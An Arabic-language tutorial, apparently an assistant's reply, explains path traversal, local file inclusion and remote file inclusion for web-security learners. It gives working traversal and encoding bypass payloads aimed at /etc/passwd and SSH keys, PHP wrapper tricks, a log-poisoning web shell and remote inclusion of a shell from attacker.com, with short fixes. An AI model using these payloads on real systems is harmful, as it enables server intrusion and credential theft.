تمام! هشرح الـ 3 مواضيع بالعمق الكامل بطريقتنا. 🎯

---

# 🔥 أولاً — Path Traversal (باث ترافيرسال)

## المعنى والنطق

**Path** = مسار **Traversal** (نطق: "ترافيرسال") = اجتياز أو تخطي

يعني: **"اجتياز المسار"** — إنك تتخطى الحدود المسموح بيها وتوصل لملفات ما المفروض تشوفها.

---

## 📖 الفكرة كقصة

تخيل إنك في فندق وعندك مفتاح غرفة رقم 101. المفتاح المفروض يفتح غرفتك بس.

بس لو لقيت إن نظام الفندق بيقبل إنك تقول **"روح للخلف خطوتين وبعدين افتح"** — تقدر توصل لغرفة المدير أو الخزنة!

**ده بالظبط الـ Path Traversal.**

الموقع بيقرأ ملفات من السيرفر بناءً على اسم الملف اللي إنت بتبعته. لو مش بيتحقق من الاسم ده، تقدر تقول له **"ارجع للخلف"** وتوصل لأي ملف على السيرفر.

---

## 🔍 إزاي بيشتغل؟

الموقع بيعمل كده:

```
طلبك:
https://site.com/image?file=photo.jpg

السيرفر بيقرأ:
/var/www/images/photo.jpg
```

لو حطينا `../` (نقطتين وسلاش) — ده معناه **"ارجع مجلد للخلف"**:

```
طلبك:
https://site.com/image?file=../../../etc/passwd

السيرفر بيقرأ:
/var/www/images/../../../etc/passwd
          ↓ بعد ما يحل الـ ../
/etc/passwd ← ملف فيه كل المستخدمين على السيرفر! 😱
```

---

## 🧮 إزاي نحسب عدد الـ `../`؟

```
/var/www/images/photo.jpg

خطوة 1: ../  →  /var/www/images/
خطوة 2: ../  →  /var/www/
خطوة 3: ../  →  /var/
خطوة 4: ../  →  /  (الـ Root)
```

من `/var/www/images/` محتاجين **3** مرات `../` عشان نوصل للـ Root `/`.

---

## 🎯 الملفات المهمة اللي بنحاول نقرأها

### على Linux:

```
/etc/passwd         ← قائمة المستخدمين على السيرفر
/etc/shadow         ← الباسوردات المشفرة (محتاج root)
/etc/hosts          ← إعدادات الشبكة
/proc/self/environ  ← متغيرات البيئة (ممكن تحتوي على Secrets)
~/.ssh/id_rsa       ← مفتاح SSH الخاص
```

### على Windows:

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Users\Administrator\Desktop\secret.txt
```

---

## 🔴 ليه الثغرة دي موجودة؟

```
Developer كتب الكود كده:
filename = request.get("file")
content  = open("/var/www/images/" + filename)

المشكلة:
مفيش تحقق من إن الـ filename
مش فيه ../
```

---

## 🛡️ الـ Bypass (تخطي الحماية)

### لو الموقع بيمسح `../`:

```
....// ← لو مسح ../ يبقى الـ .. والـ / مسحهم
         ويفضل ../

..././ ← نفس الفكرة
```

### لو الموقع محتاج الاسم يبدأ بـ `/var/www/`:

```
/var/www/images/../../../etc/passwd
← بيبدأ بالمسار الصح وبعدين بنرجع
```

### لو الموقع بيشترط إن الملف ينتهي بـ `.jpg`:

```
../../../etc/passwd%00.jpg
↑ Null Byte (نل بايت) — بيخلي السيرفر يوقف القراءة هنا
                في بعض الأنظمة القديمة
```

### URL Encoding (يو آر إل إنكودينج):

```
.. = %2e%2e
/  = %2f

يعني: %2e%2e%2f = ../
```

---

## 🛠️ الخطوات العملية في Burp

### الخطوة 1 — دور على Parameters بتحمل ملفات

```
?file=image.jpg
?page=home.html
?template=main
?path=/images/photo
```

### الخطوة 2 — جرب الـ Payload الأساسي

في Burp Repeater:

```
?file=../../../etc/passwd
```

### الخطوة 3 — لو مش شغال جرب الـ Bypass

```
?file=....//....//....//etc/passwd
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=..%252f..%252f..%252fetc%252fpasswd
```

### الخطوة 4 — علامة النجاح

لو شوفت في الـ Response حاجة زي:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

يبقى نجحت! ✅

---

## 📋 ملخص Path Traversal

```
الهدف:     قراءة ملفات على السيرفر
الأداة:    ../  للرجوع في المجلدات
الهدف:    /etc/passwd أو أي ملف حساس
الخطر:    قراءة كلمات سر / مفاتيح / كود المصدر
```

---

---

# 🔥 ثانياً — LFI (Local File Inclusion)

## المعنى والنطق

**LFI** = Local File Inclusion 
**Local** (لوكال) = محلي
**File** (فايل) = ملف 
**Inclusion** (نطق: "إن-كلو-جِن") = تضمين أو إدراج

يعني: **"تضمين ملف محلي"** — إنك تخلي السيرفر يقرأ ويشغّل ملف موجود عليه هو.

---

## 📖 الفرق بين Path Traversal وLFI

```
Path Traversal:
← بس بيقرأ محتوى الملف
← زي إنك بتفتح الملف بعينيك بس

LFI:
← بيقرأ الملف
 AND بيشغله/يضمنه في الصفحة
← لو الملف فيه كود PHP مثلاً بيتنفذ! 😱
```

---

## 📖 الفكرة كقصة

تخيل موقع بيعمل صفحات مختلفة كده:

```
https://site.com?page=home
https://site.com?page=about
https://site.com?page=contact
```

السيرفر بياخد الـ `page` وبيضمنه في الصفحة:

```php
<?php
  $page = $_GET['page'];
  include($page . ".php");
?>
```

لو مفيش تحقق على الـ `$page` ده، تقدر تحط أي ملف!

---

## 🎯 إزاي بنستغل الـ LFI؟

### المرحلة 1 — قراءة ملفات حساسة

```
?page=../../../etc/passwd
```

نفس Path Traversal بس هنا الملف بيتضمن في الصفحة.

### المرحلة 2 — قراءة كود المصدر بـ Base64

في PHP تقدر تقرأ الملفات كـ Base64 عشان الكود ما يتنفذش:

```
?page=php://filter/convert.base64-encode/resource=index.php
```

الـ Response هيجيب الكود بتاع `index.php` مشفر بـ Base64 — بتفكه وتشوف الكود الكامل.

### المرحلة 3 — Log Poisoning (تسميم السجلات)

ده أخطر استخدام للـ LFI! بيخليك تنفذ كود على السيرفر.

**الفكرة:**

```
السيرفر بيسجل كل الـ 
Requests 
في ملف 
Log
مثلاً: /var/log/apache2/access.log

لو حقنا 
PHP Code 
في الـ
 Log
وبعدين ضمنا الـ
 Log
  بالـ 
  LFI
= الكود اتنفذ على السيرفر! 😱
```

**الخطوات:**

```
الخطوة 1 — حقن PHP في الـ User-Agent:
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

الخطوة 2 — ضمّن الـ Log:
?page=../../../var/log/apache2/access.log&cmd=id

النتيجة:
uid=33(www-data) gid=33(www-data) ← الكود اتنفذ! ✅
```

---

## 🔴 ليه الثغرة دي موجودة؟

```php
// ❌ كود خطأ:
include($_GET['page'] . ".php");

// ✅ كود صح:
$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page'] . ".php");
}
```

---

## 🛡️ الـ Bypass للـ LFI

### لو الكود بيضيف `.php` في الآخر:

```
# Null Byte (في PHP قبل 5.3):
?page=../../../etc/passwd%00

# Path Truncation:
?page=../../../etc/passwd/./././././././
```

### الـ PHP Wrappers (رابرز — يعني غلافات):

```
# قراءة ملف كـ Base64:
?page=php://filter/convert.base64-encode/resource=config.php

# تنفيذ كود مباشرة:
?page=data://text/plain,<?php system('id'); ?>

# قراءة ملف عادي:
?page=file:///etc/passwd
```

---

## 🛠️ الخطوات العملية في Burp

### الخطوة 1 — لاقي الـ Parameter المناسب

```
?page=home
?file=template.html
?include=header
?lang=en
```

### الخطوة 2 — جرب قراءة ملف حساس

```
?page=../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=../config.php
```

### الخطوة 3 — جرب Log Poisoning

```
# في Burp Repeater غير الـ User-Agent:
User-Agent: <?php system($_GET['cmd']); ?>

# بعدين ضمن الـ Log:
?page=../../../var/log/apache2/access.log&cmd=whoami
```

---

## 📋 ملخص LFI

```
الهدف:     تضمين وتنفيذ ملفات محلية على السيرفر
الخطورة:   من قراءة ملفات → لـ تنفيذ أوامر (RCE)
الأداة:    PHP Wrappers + Log Poisoning
الأخطر:   Log Poisoning → Remote Code Execution
```

---

---

# 🔥 ثالثاً — RFI (Remote File Inclusion)

## المعنى والنطق

**RFI** = Remote File Inclusion **Remote** (نطق: "ريموت") = بعيد أو خارجي **File** (فايل) = ملف **Inclusion** (إن-كلو-جِن) = تضمين

يعني: **"تضمين ملف خارجي"** — إنك تخلي السيرفر يجيب ملف من سيرفرك أنت وينفذه!

---

## 📖 الفرق الجوهري بين LFI و RFI

```
LFI (Local):
← بيضمن ملف موجود على السيرفر نفسه
← محدود بالملفات الموجودة

RFI (Remote):
← بيضمن ملف من سيرفر خارجي (سيرفرك أنت!)
← تقدر تحط أي كود عايزه ✅
```

---

## 📖 الفكرة كقصة

تخيل نفس الموقع بتاعنا:

```php
<?php
  $page = $_GET['page'];
  include($page . ".php");
?>
```

في الـ LFI كنا بنحط مسار ملف محلي. في الـ RFI بنحط **URL لسيرفرنا:**

```
?page=http://attacker.com/shell
```

السيرفر هيروح يجيب ملف `shell.php` من سيرفرنا وينفذه على نفسه! 😱

---

## 🎯 إزاي بنستغل الـ RFI؟

### الخطوة 1 — جهّز الـ Malicious File (الملف الخبيث)

على سيرفرك أنت، اعمل ملف `shell.php`:

```php
<?php
  system($_GET['cmd']);
?>
```

### الخطوة 2 — شغّل HTTP Server على سيرفرك

```bash
# في Kali Linux:
python3 -m http.server 80
```

### الخطوة 3 — ابعت الـ RFI Request

```
?page=http://YOUR-IP/shell
```

### الخطوة 4 — نفّذ أوامر

```
?page=http://YOUR-IP/shell&cmd=whoami
?page=http://YOUR-IP/shell&cmd=ls /
?page=http://YOUR-IP/shell&cmd=cat /etc/passwd
```

---

## 🔴 ليه الثغرة دي موجودة؟

```
PHP عندها إعداد اسمه:
allow_url_include = On ← ده بيسمح بالـ RFI

المفروض يكون:
allow_url_include = Off ← ده بيمنع الـ RFI
```

---

## مقارنة LFI vs RFI

```
┌─────────────────────────────────────────────────┐
│              LFI vs RFI مقارنة                  │
├──────────────────┬──────────────────────────────┤
│      LFI         │         RFI                  │
├──────────────────┼──────────────────────────────┤
│ ملف محلي         │ ملف خارجي                    │
│ ../etc/passwd    │ http://attacker.com/shell     │
├──────────────────┼──────────────────────────────┤
│ محتاج ملف        │ إنت بتجيب الملف              │
│ موجود على        │ بتاعك أنت                    │
│ السيرفر          │                              │
├──────────────────┼──────────────────────────────┤
│ أشيع             │ أندر (محتاج allow_url_include)│
├──────────────────┼──────────────────────────────┤
│ خطير             │ أخطر بكتير ← RCE مباشر      │
└──────────────────┴──────────────────────────────┘
```

---

# 🎯 الصورة الكاملة للـ 3 ثغرات مع بعض

```
┌─────────────────────────────────────────────────────┐
│         Path Traversal → LFI → RFI                  │
│              تصاعد في الخطورة                       │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Path Traversal:                                    │
│  بيقرأ ملفات ← أقل خطورة                           │
│  ../../../etc/passwd                                │
│                                                     │
│  LFI:                                               │
│  بيقرأ + بيضمن + ممكن ينفذ                         │
│  php://filter/... أو Log Poisoning                  │
│                                                     │
│  RFI:                                               │
│  بيجيب ملفك أنت وينفذه ← الأخطر                   │
│  http://attacker.com/shell.php                      │
│                                                     │
└─────────────────────────────────────────────────────┘
```

---

# 📋 الملخص الذهبي

```
Path Traversal:
← ../../../etc/passwd
← قراءة ملفات فقط

LFI:
← تضمين ملفات محلية
← php://filter للقراءة
← Log Poisoning للـ RCE

RFI:
← تضمين ملفات خارجية
← http://YOUR-SERVER/shell.php
← RCE مباشر ومباشر

المشترك بينهم:
← Input غير محمي
← السيرفر بيثق في المستخدم
← مفيش Whitelist للملفات المسموح بيها
```

---

فيه حاجة عايز أشرحها أكتر؟ 🔍